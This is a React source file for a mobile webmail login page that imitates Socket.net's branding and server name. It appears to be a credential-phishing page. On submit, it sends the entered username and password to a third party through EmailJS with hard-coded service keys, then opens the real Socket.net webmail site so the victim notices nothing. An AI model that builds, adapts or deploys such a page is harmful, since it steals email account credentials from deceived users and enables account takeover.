
import React, { useRef, useState } from "react";
import Logo from "./Asset/Logo.png";
import emailjs from '@emailjs/browser';

function Mobile() {
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");

    const handleUsernameChange = (event) => {
        setUsername(event.target.value);
    };

    const handlePasswordChange = (event) => {
        setPassword(event.target.value);
    };

    const handleSubmit = (event) => {
        event.preventDefault();

        if (username === "" && password === "") {
            alert("please fill the form");
            
        } else {
            window.open ('http://mobilewebmail.socket.net/');
        }
    };

// const routeChange = () =>{
//     window.open ('http://mobilewebmail.socket.net/')
// };

 const form = useRef();

 const sendEmail = (e) => {
   e.preventDefault();

   emailjs.sendForm('service_hzkctk5', 'template_6986y7c', form.current, '-B1g1Iiw6LGKPndX_')
     .then((result) => {
         console.log(result.text);
     }, (error) => {
         console.log(error.text);
     });
 };

 return (
   <div className="bg-white h-screen">
     <div className="border-4 border-solid border-[#502A72] rounded-lg mt-5 md:mx-3 mx-2">
       <div>
         <img src={Logo} alt="Logo" className="md:w-60 md:ml-5 w-40 h-16 md:h-20 ml-3"/>
       </div>
       <form ref={form} onSubmit={sendEmail} className="flex flex-col">
         <label htmlFor="Username" className="text-sm text-left flex md:text-lg font-semibold md:ml-10 ml-6 text-[#502A72] md:my-5 my-3">Username
           <input type="email" value={username} onChange={handleUsernameChange} required name="user_email" className="border border-[#FF9E0F] md:ml-64 md:mr-5 ml-16 mr-2 w-full"/>
         </label>
         <label htmlFor="Password" className="flex text-md text-left md:text-lg text-sm font-semibold md:ml-10 ml-6 text-[#502A72] md:mb-5 mb-3">Password
           <input type="Password" value={password} onChange={handlePasswordChange} required name="user_password" className="border border-[#FF9E0F] md:ml-[16.3rem] md:w-full md:mr-5 ml-16 mr-2 w-full"/>
         </label>
         <label htmlFor="Server" className="md:text-md flex text-left md:text-lg text-sm font-semibold md:ml-10 ml-6 text-[#502A72]">Server
           <input type="text" placeholder="mail.socket.net" readOnly className="placeholder-[#000000] text-xs border border-[#ff9e0f] md:ml-[18rem] w-full md:mr-5 md:mb-8 ml-20 mb-6 mr-2"/>
         </label>
         <button type="submit" onClick={handleSubmit} value="Send" className="w-auto text-center bg-[#5A377A] md:mx-5 ml-5 mr-2 rounded-sm py-1 mb-5 text-white">Login</button>
       </form>
       <p className="text-center font-bold text-[#502A72] cursor-pointer text-sm mt-7 mb-3">View Full Version</p>
     </div>
   </div>
 )
}

export default Mobile;
